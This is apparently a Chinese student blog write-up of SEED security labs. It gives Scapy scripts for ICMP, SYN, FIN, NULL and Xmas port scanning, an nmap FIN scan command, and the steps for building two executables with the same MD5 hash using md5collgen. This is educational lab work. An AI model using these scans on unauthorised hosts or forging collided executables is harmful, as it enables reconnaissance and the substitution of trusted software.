class="card-archive-list-count-group"><span class="card-archive-list-count">3</span><span>篇</span></div></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2022/02/"><span class="card-archive-list-date">二月 2022</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">1</span><span>篇</span></div></a></li></ul></div><hr/></div></div></div><div class="button-group"><div class="console-btn-item"><a class="darkmode_switchbutton" title="显示模式切换" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-moon"></i></a></div><div class="console-btn-item" id="consoleHideAside" onclick="anzhiyu.hideAsideBtn()" title="边栏显示控制"><a class="asideSwitch"><i class="anzhiyufont anzhiyu-icon-arrows-left-right"></i></a></div></div><div class="console-mask" onclick="anzhiyu.hideConsole()" href="javascript:void(0);"></div></div><div class="nav-button" id="nav-totop"><a class="totopbtn" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-arrow-up"></i><span id="percent" onclick="anzhiyu.scrollToDest(0,500)">0</span></a></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);" title="切换"><i class="anzhiyufont anzhiyu-icon-bars"></i></a></div></div></div></nav><div id="post-info"><div id="post-firstinfo"><div class="meta-firstline"><a class="post-meta-original">原创</a><span class="post-meta-categories"><span class="post-meta-separator"></span><i class="anzhiyufont anzhiyu-icon-inbox post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E5%AE%89%E5%85%A8/" itemprop="url">安全</a></span><span class="article-meta tags"><a class="article-meta__tags" href="/tags/%E5%AE%89%E5%85%A8/" tabindex="-1" itemprop="url"> <span> <i class="anzhiyufont anzhiyu-icon-hashtag"></i>安全</span></a></span></div></div><h1 class="post-title" itemprop="name headline">SEED Labs 2.0</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="anzhiyufont anzhiyu-icon-calendar-days post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" itemprop="dateCreated datePublished" datetime="2023-09-03T16:00:00.000Z" title="发表于 2023-09-04 00:00:00">2023-09-04</time><span class="post-meta-separator"></span><i class="anzhiyufont anzhiyu-icon-history post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" itemprop="dateCreated datePublished" datetime="2023-11-28T16:00:00.000Z" title="更新于 2023-11-29 00:00:00">2023-11-29</time></span></div><div class="meta-secondline"><span class="post-meta-separator">       </span><span class="post-meta-position" title="作者IP属地为成都"><i class="anzhiyufont anzhiyu-icon-location-dot"></i>成都</span></div></div></div><section class="main-hero-waves-area waves-area"><svg class="waves-svg" xmlns="http://www.w3.org/2000/svg" xlink="http://www.w3.org/1999/xlink" viewBox="0 24 150 28" preserveAspectRatio="none" shape-rendering="auto"><defs><path id="gentle-wave" d="M -160 44 c 30 0 58 -18 88 -18 s 58 18 88 18 s 58 -18 88 -18 s 58 18 88 18 v 44 h -352 Z"></path></defs><g class="parallax"><use href="#gentle-wave" x="48" y="0"></use><use href="#gentle-wave" x="48" y="3"></use><use href="#gentle-wave" x="48" y="5"></use><use href="#gentle-wave" x="48" y="7"></use></g></svg></section><div id="post-top-cover"><img class="nolazyload" id="post-top-bg" src="https://imagerepoyu.oss-cn-hangzhou.aliyuncs.com/blog20231129143832.png"></div></header><main id="blog-container"><div class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container" itemscope itemtype="https://jieyugit.github.io/2023/09/04/20231129-SEED-Labs-2.0/"><header><a class="post-meta-categories" href="/categories/%E5%AE%89%E5%85%A8/" itemprop="url">安全</a><a href="/tags/%E5%AE%89%E5%85%A8/" tabindex="-1" itemprop="url">安全</a><h1 id="CrawlerTitle" itemprop="name headline">SEED Labs 2.0</h1><span itemprop="author" itemscope itemtype="http://schema.org/Person">Johnny</span><time itemprop="dateCreated datePublished" datetime="2023-09-03T16:00:00.000Z" title="发表于 2023-09-04 00:00:00">2023-09-04</time><time itemprop="dateCreated datePublished" datetime="2023-11-28T16:00:00.000Z" title="更新于 2023-11-29 00:00:00">2023-11-29</time></header><h1 id="端口扫描工具"><a href="#端口扫描工具" class="headerlink" title="端口扫描工具"></a>端口扫描工具</h1><h2 id="使用ICMP协议探测主机是否开启"><a href="#使用ICMP协议探测主机是否开启" class="headerlink" title="使用ICMP协议探测主机是否开启"></a>使用ICMP协议探测主机是否开启</h2><h3 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">ping</span>(<span class="params">host</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Testing：&quot;</span>, host)</span><br><span class="line">    pkt = IP(dst=host) / ICMP() / <span class="string">b&#x27;I\&#x27;m a ping packet &#x27;</span></span><br><span class="line">    reply = sr1(pkt, timeout=<span class="number">2</span>, verbose=<span class="literal">False</span>)  <span class="comment"># 接收一个回复包</span></span><br><span class="line">    <span class="keyword">if</span> reply:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;host&#125;</span> is up!&quot;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;host&#125;</span> is down!&quot;</span>)</span><br></pre></td></tr></table></figure>

<p>Ping请求数据包。它使用了Scapy库来构建网络数据包。</p>
<ul>
<li><code>IP(dst=host)</code>: 这部分代码创建了一个IP数据包，其中 <code>dst</code> 参数设置为传递给函数的主机地址。这是Ping请求的目标主机地址</li>
<li><code>ICMP()</code>: 这部分代码创建了一个ICMP包，用于发送Ping请求</li>
<li><code>b&#39;I\&#39;m a ping packet &#39;</code>: payload包含文本消息的字节序列</li>
</ul>
<h3 id="结果"><a href="#结果" class="headerlink" title="结果"></a>结果</h3><p>对于开启的主机来说当接收到ICMP之后会进行响应，但是对于关闭的主机则没有响应</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://imagerepoyu.oss-cn-hangzhou.aliyuncs.com/blogblogimage-20230920140322094.png" alt="image-20230920140322094"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://imagerepoyu.oss-cn-hangzhou.aliyuncs.com/blogimage-20230920140441749.png" alt="image-20230920140441749"></p>
<h2 id="半连接扫描"><a href="#半连接扫描" class="headerlink" title="半连接扫描"></a>半连接扫描</h2><h3 id="代码-1"><a href="#代码-1" class="headerlink" title="代码"></a>代码</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">scan_S</span>(<span class="params">ip, port</span>):</span><br><span class="line">    p = IP(dst=ip) / TCP(dport=<span class="built_in">int</span>(port), flags=<span class="string">&quot;S&quot;</span>)</span><br><span class="line">    link = sr1(p, timeout=<span class="number">1</span>, verbose=<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">if</span> link.haslayer(TCP):</span><br><span class="line">        <span class="keyword">if</span> link.getlayer(TCP).flags == <span class="string">&#x27;SA&#x27;</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;[SYN]The PORT is open.&quot;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[SYN]The PORT is closed.&quot;</span>)</span><br></pre></td></tr></table></figure>

<ul>
<li><p><code>p = IP(dst=ip) / TCP(dport=int(port), flags=&quot;S&quot;)</code>: 这一行代码创建了一个TCP SYN请求数据包。</p>
<ul>
<li><p><code>IP(dst=ip)</code>: 这部分代码创建了一个IP数据包，其中 <code>dst</code> 参数设置为传递给函数的目标主机的IP地址。</p>
</li>
<li><p><code>TCP(dport=int(port), flags=&quot;S&quot;)</code>: 这部分代码创建了一个TCP数据包，其中 <code>dport</code> 参数设置为传递给函数的端口号，<code>flags</code> 参数设置为 “S”，表示发送一个TCP SYN请求。</p>
</li>
<li><p><code>link = sr1(p, timeout=1, verbose=1)</code>: 这一行代码使用Scapy库发送TCP SYN请求数据包到目标主机的指定端口，并等待回复。具体解释如下：</p>
</li>
</ul>
</li>
<li><p><code>verbose=1</code>: 这个参数设置为1，表示显示详细的Scapy输出信息，以便查看扫描进度。</p>
</li>
</ul>
<ol>
<li><code>if link.haslayer(TCP):</code>: 这是一个条件语句，用于检查接收到的数据包是否包含TCP层。</li>
<li><code>if link.getlayer(TCP).flags == &#39;SA&#39;:</code>: 如果数据包包含TCP层，这一行代码用于检查TCP层中的标志是否为 ‘SA’，表示TCP连接建立成功，端口是开放的。</li>
<li><code>print(&quot;[SYN]The PORT is open.&quot;)</code>: 如果端口是开放的，代码将打印出 “[SYN]The PORT is open.” 消息。</li>
<li><code>else:</code>: 如果数据包不包含TCP层或标志不是 ‘SA’，则表示端口不是开放的。</li>
<li><code>print(&quot;[SYN]The PORT is closed.&quot;)</code>: 在这种情况下，代码将打印出 “[SYN]The PORT is closed.” 消息。</li>
</ol>
<h3 id="结果-1"><a href="#结果-1" class="headerlink" title="结果"></a>结果</h3><p>对于未开放的端口发送SYN时，包直接被丢弃</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://imagerepoyu.oss-cn-hangzhou.aliyuncs.com/blogimage-20230920141139468.png" alt="image-20230920141139468"></p>
<p>对于开放的端口，服务器将回复SYN ACK</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://imagerepoyu.oss-cn-hangzhou.aliyuncs.com/blogblogimage-20230920141215628.png" alt="image-20230920141215628"></p>
<h2 id="FIN"><a href="#FIN" class="headerlink" title="FIN"></a>FIN</h2><h3 id="代码-2"><a href="#代码-2" class="headerlink" title="代码"></a>代码</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">scan_F</span>(<span class="params">ip, port</span>):</span><br><span class="line">    p = IP(dst=ip) / TCP(dport=<span class="built_in">int</span>(port), flags=<span class="string">&quot;F&quot;</span>)</span><br><span class="line">    link = sr1(p, timeout=<span class="number">1</span>, verbose=<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">if</span> link == <span class="literal">None</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[FIN]The PORT is open.&quot;</span>)</span><br><span class="line">    <span class="keyword">elif</span> link != <span class="literal">None</span> <span class="keyword">and</span> link.getlayer(TCP).flags == <span class="string">&#x27;RA&#x27;</span>:</span><br><span class="line">        link.display()</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[FIN]The PORT is closed.&quot;</span>)</span><br></pre></td></tr></table></figure>

<ol>
<li><code>p = IP(dst=ip) / TCP(dport=int(port), flags=&quot;F&quot;)</code>: 这一行代码创建了一个TCP FIN请求数据包。具体解释如下：<ul>
<li><code>IP(dst=ip)</code>: 这部分代码创建了一个IP数据包，其中 <code>dst</code> 参数设置为传递给函数的目标主机的IP地址。</li>
<li><code>TCP(dport=int(port), flags=&quot;F&quot;)</code>: 这部分代码创建了一个TCP数据包，其中 <code>dport</code> 参数设置为传递给函数的端口号，<code>flags</code> 参数设置为 “F”，表示发送一个TCP FIN请求。</li>
</ul>
</li>
<li><code>link = sr1(p, timeout=1, verbose=1)</code>: 这一行代码使用Scapy库发送TCP FIN请求数据包到目标主机的指定端口，并等待回复。</li>
<li><code>if link == None:</code>: 这是一个条件语句，用于检查是否接收到了回复数据包。</li>
<li><code>print(&quot;[FIN]The PORT is open.&quot;)</code>: 如果没有接收到回复数据包，说明端口是开放的，因为没有收到TCP FIN-ACK响应。</li>
<li><code>elif link != None and link.getlayer(TCP).flags == &#39;RA&#39;:</code>: 如果接收到了回复数据包，并且该数据包的TCP标志为 ‘RA’（RST-ACK），则表示端口是关闭的。</li>
<li><code>link.display()</code>: 这一行代码用于显示接收到的回复数据包的详细信息，包括IP和TCP头部的信息。</li>
<li><code>print(&quot;[FIN]The PORT is closed.&quot;)</code>: 最后，代码打印出 “[FIN]The PORT is closed.” 消息，表示端口是关闭的。</li>
</ol>
<h3 id="结果-2"><a href="#结果-2" class="headerlink" title="结果"></a>结果</h3><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://imagerepoyu.oss-cn-hangzhou.aliyuncs.com/blogblogimage-20230920141707152.png" alt="image-20230920141707152"></p>
<h2 id="NULL"><a href="#NULL" class="headerlink" title="NULL"></a>NULL</h2><h3 id="代码-3"><a href="#代码-3" class="headerlink" title="代码"></a>代码</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">p = IP(dst=ip) / TCP(dport=<span class="built_in">int</span>(port), flags=<span class="string">&quot;&quot;</span>)</span><br><span class="line">link = sr1(p, timeout=<span class="number">1</span>, verbose=<span class="number">1</span>)</span><br><span class="line"><span class="keyword">if</span> link == <span class="literal">None</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[NULL]The PORT is open.&quot;</span>)</span><br><span class="line"><span class="keyword">elif</span> link != <span class="literal">None</span> <span class="keyword">and</span> link.getlayer(TCP).flags == <span class="string">&#x27;RA&#x27;</span>:</span><br><span class="line">    link.display()</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[NULL]The PORT is closed.&quot;</span>)</span><br></pre></td></tr></table></figure>

<p>检测指定主机的指定端口是否处于开放状态。与之前的FIN扫描和SYN扫描不同，NULL扫描发送一个没有标志位（flags）的TCP数据包，因此不应该触发目标主机的任何特定响应。</p>
<ol>
<li><code>p = IP(dst=ip) / TCP(dport=int(port), flags=&quot;&quot;)</code>: 这一行代码创建了一个TCP NULL请求数据包。<ul>
<li><code>IP(dst=ip)</code>: 这部分代码创建了一个IP数据包，其中 <code>dst</code> 参数设置为传递给函数的目标主机的IP地址。</li>
<li><code>TCP(dport=int(port), flags=&quot;&quot;)</code>: 这部分代码创建了一个TCP数据包，其中 <code>dport</code> 参数设置为传递给函数的端口号，但 <code>flags</code> 参数设置为空字符串，表示发送一个TCP NULL请求，即没有设置任何标志位。</li>
</ul>
</li>
<li><code>link = sr1(p, timeout=1, verbose=1)</code>: 这一行代码使用Scapy库发送TCP NULL请求数据包到目标主机的指定端口，并等待回复。</li>
<li><code>print(&quot;[NULL]The PORT is open.&quot;)</code>: 如果没有接收到回复数据包，说明端口是开放的，因为没有收到TCP响应（因为发送的是一个空的TCP数据包）。</li>
<li><code>elif link != None and link.getlayer(TCP).flags == &#39;RA&#39;:</code>: 如果接收到了回复数据包，并且该数据包的TCP标志为 ‘RA’（RST-ACK），则表示端口是关闭的。</li>
<li><code>link.display()</code>: 这一行代码用于显示接收到的回复数据包的详细信息，包括IP和TCP头部的信息。</li>
<li><code>print(&quot;[NULL]The PORT is closed.&quot;)</code>: 最后，代码打印出 “[NULL]The PORT is closed.” 消息，表示端口是关闭的。</li>
</ol>
<h3 id="结果-3"><a href="#结果-3" class="headerlink" title="结果"></a>结果</h3><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://imagerepoyu.oss-cn-hangzhou.aliyuncs.com/blogblogimage-20230920141915704.png" alt="image-20230920141915704"></p>
<h2 id="Xmas"><a href="#Xmas" class="headerlink" title="Xmas"></a>Xmas</h2><h3 id="代码-4"><a href="#代码-4" class="headerlink" title="代码"></a>代码</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">p = IP(dst=ip) / TCP(dport=<span class="built_in">int</span>(port), flags=<span class="string">&quot;FPU&quot;</span>)</span><br><span class="line">link = sr1(p, timeout=<span class="number">1</span>, verbose=<span class="number">1</span>)</span><br><span class="line"><span class="keyword">if</span> link == <span class="literal">None</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[Xmas]The PORT is open.&quot;</span>)</span><br><span class="line"><span class="keyword">elif</span> link != <span class="literal">None</span> <span class="keyword">and</span> link.getlayer(TCP).flags == <span class="string">&#x27;RA&#x27;</span>:</span><br><span class="line">    link.display()</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[Xmas]The PORT is closed.&quot;</span>)</span><br></pre></td></tr></table></figure>

<ol>
<li><code>p = IP(dst=ip) / TCP(dport=int(port), flags=&quot;FPU&quot;)</code>: 这一行代码创建了一个TCP Xmas请求数据包。<ul>
<li><code>TCP(dport=int(port), flags=&quot;FPU&quot;)</code>: 这部分代码创建了一个TCP数据包，其中 <code>dport</code> 参数设置为传递给函数的端口号，而 <code>flags</code> 参数设置为 “FPU”，表示发送一个TCP Xmas请求，即将FIN、PSH和URG标志位都设置为1。</li>
</ul>
</li>
<li><code>link = sr1(p, timeout=1, verbose=1)</code>: 这一行代码使用Scapy库发送TCP Xmas请求数据包到目标主机的指定端口，并等待回复。</li>
<li><code>if link == None:</code>: 这是一个条件语句，用于检查是否接收到了回复数据包。</li>
<li><code>print(&quot;[Xmas]The PORT is open.&quot;)</code>: 如果没有接收到回复数据包，说明端口是开放的，因为没有收到TCP响应（因为发送的是一个Xmas请求，不符合正常的TCP握手）。</li>
<li><code>elif link != None and link.getlayer(TCP).flags == &#39;RA&#39;:</code>: 如果接收到了回复数据包，并且该数据包的TCP标志为 ‘RA’（RST-ACK），则表示端口是关闭的。</li>
<li><code>print(&quot;[Xmas]The PORT is closed.&quot;)</code>: 最后，代码打印出 “[Xmas]The PORT is closed.” 消息，表示端口是关闭的。</li>
</ol>
<h3 id="结果-4"><a href="#结果-4" class="headerlink" title="结果"></a>结果</h3><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://imagerepoyu.oss-cn-hangzhou.aliyuncs.com/blogimage-20230920142024251.png" alt="image-20230920142024251"></p>
<h2 id="FIN-NULL-Xmas存在的问题"><a href="#FIN-NULL-Xmas存在的问题" class="headerlink" title="FIN NULL Xmas存在的问题"></a>FIN NULL Xmas存在的问题</h2><p>首先我使用wireshark对虚拟机的端口进行抓包，以FIN为例，使用nmap进行FIN扫描，命令为：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap 192.168.xx.xx -p xx -sF</span><br></pre></td></tr></table></figure>

<p>分别对开放端口22 和关闭的端口8888进行扫描，发现nmap确实发了一个只有FIN置位的TCP包，但是服务器都没有响应</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://imagerepoyu.oss-cn-hangzhou.aliyuncs.com/blogimage-20230920161714505.png" alt="image-20230920161714505"></p>
<p>之后我查看了LINUX的源码（内核版本5.4.0）</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://imagerepoyu.oss-cn-hangzhou.aliyuncs.com/blogblogimage-20230920161747708.png" alt="image-20230920161747708"></p>
<p>在进行实验的过程中，使用Scapy直接对服务器进行连接，初始状态为<strong>TCP_LISTEN</strong>, 同时进行三个判断，分别为<strong>ack rst syn</strong>(再进行fin)，其他情况全部<strong>丢弃</strong>。 所以我认为是linux系统自动把非法的包给丢弃了。</p>
<h1 id="MD5碰撞攻击实验"><a href="#MD5碰撞攻击实验" class="headerlink" title="MD5碰撞攻击实验"></a>MD5碰撞攻击实验</h1><h2 id="Task1"><a href="#Task1" class="headerlink" title="Task1"></a>Task1</h2><p>首先编写一个内容为hello world的·prefix.txt文件</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://imagerepoyu.oss-cn-hangzhou.aliyuncs.com/blogimage-20230925152442817.png" alt="image-20230925152442817"></p>
<h3 id="Question-1-If-the-length-of-your-prefix-file-is-not-multiple-of-64-what-is-going-to-happen"><a href="#Question-1-If-the-length-of-your-prefix-file-is-not-multiple-of-64-what-is-going-to-happen" class="headerlink" title="Question 1. If the length of your prefix file is not multiple of 64, what is going to happen?"></a>Question 1. If the length of your prefix file is not multiple of 64, what is going to happen?</h3><p>在末尾补0</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://imagerepoyu.oss-cn-hangzhou.aliyuncs.com/blogimage-20230925153358169.png" alt="image-20230925153358169"></p>
<h3 id="Question-2-Create-a-prefix-file-with-exactly-64-bytes-and-run-the-collision-tool-again-and-see-what-happens"><a href="#Question-2-Create-a-prefix-file-with-exactly-64-bytes-and-run-the-collision-tool-again-and-see-what-happens" class="headerlink" title="Question 2. Create a prefix file with exactly 64 bytes, and run the collision tool again, and see what happens."></a>Question 2. Create a prefix file with exactly 64 bytes, and run the collision tool again, and see what happens.</h3><p>创建了一个64比特的文件，生成的两个文件md5值还是相同的</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://imagerepoyu.oss-cn-hangzhou.aliyuncs.com/blogimage-20230925153852263.png" alt="image-20230925153852263"></p>
<p>通过bless文件查看两个文件的二进制，发现末尾没有继续添0了</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://imagerepoyu.oss-cn-hangzhou.aliyuncs.com/blogimage-20230925153948130.png" alt="image-20230925153948130"></p>
<h3 id="Are-the-data-128-bytes-generated-by-md5collgen-completely-different-for-the-two-output-files-Please-identify-all-the-bytes-that-are-different"><a href="#Are-the-data-128-bytes-generated-by-md5collgen-completely-different-for-the-two-output-files-Please-identify-all-the-bytes-that-are-different" class="headerlink" title="Are the data (128 bytes) generated by md5collgen completely different for the two output files? Please identify all the bytes that are different."></a>Are the data (128 bytes) generated by md5collgen completely different for the two output files? Please identify all the bytes that are different.</h3><p>构造出test.txt大小为128bytes</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://imagerepoyu.oss-cn-hangzhou.aliyuncs.com/blogimage-20230925154945912.png" alt="image-20230925154945912"></p>
<p>生成两个out文件，MD5值相同</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://imagerepoyu.oss-cn-hangzhou.aliyuncs.com/blogimage-20230925155053404.png" alt="image-20230925155053404"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://imagerepoyu.oss-cn-hangzhou.aliyuncs.com/blogimage-20230925155122534.png" alt="image-20230925155122534"></p>
<p>查看二进制文件发现两个文件只有五处不同</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://imagerepoyu.oss-cn-hangzhou.aliyuncs.com/blogimage-20230925155356513.png" alt="image-20230925155356513"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://imagerepoyu.oss-cn-hangzhou.aliyuncs.com/blogimage-20230925155420463.png" alt="image-20230925155420463"></p>
<h2 id="Task-2-Understanding-MD5’s-Property"><a href="#Task-2-Understanding-MD5’s-Property" class="headerlink" title="Task 2: Understanding MD5’s Property"></a>Task 2: Understanding MD5’s Property</h2><p>向两个文件添加后缀之后MD5的值还是相同的</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://imagerepoyu.oss-cn-hangzhou.aliyuncs.com/blogimage-20230925160743368.png" alt="image-20230925160743368"></p>
<h2 id="Task-3-Generating-Two-Executable-Files-with-the-Same-MD5-Hash"><a href="#Task-3-Generating-Two-Executable-Files-with-the-Same-MD5-Hash" class="headerlink" title="Task 3: Generating Two Executable Files with the Same MD5 Hash"></a>Task 3: Generating Two Executable Files with the Same MD5 Hash</h2><p>和指导文件里一样，我们先使用0x41填充<code>xyz</code>数组</p>
<p>之后通过bless查看二进制中，<code>xyz</code>数组数据的位置，如下图</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://imagerepoyu.oss-cn-hangzhou.aliyuncs.com/blogimage-20230925171322973.png" alt="image-20230925171322973"></p>
<p>从第12320再偏移200个字符都是数组的区域</p>
<p>取64（0x40）的倍数0x3040。十进制12352</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">head -c 12352 code &gt; prefix</span><br></pre></td></tr></table></figure>

<p>再使用md5collgen生成两个不同的前缀 a,b</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://imagerepoyu.oss-cn-hangzhou.aliyuncs.com/blogimage-20230925171638195.png" alt="image-20230925171638195"></p>
<p>生成的大小为12480，所以我们需要保留原始程序中12480之后的代码</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tail -c +12481 a.out &gt; suffix</span><br></pre></td></tr></table></figure>

<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://imagerepoyu.oss-cn-hangzhou.aliyuncs.com/blogimage-20230925172054174.png" alt="image-20230925172054174"></p>
<p>之后拼接上不同的头 生成两个程序</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://imagerepoyu.oss-cn-hangzhou.aliyuncs.com/blogimage-20230925172315877.png" alt="image-20230925172315877"></p>
<p>给程序添加权限执行之后的结果进行比较之后发现不一样，但是MD5值是一样的：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://imagerepoyu.oss-cn-hangzhou.aliyuncs.com/blogimage-20230925172503193.png" alt="image-20230925172503193"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://imagerepoyu.oss-cn-hangzhou.aliyuncs.com/blogimage-20230925172529564.png" alt="image-20230925172529564"></p>
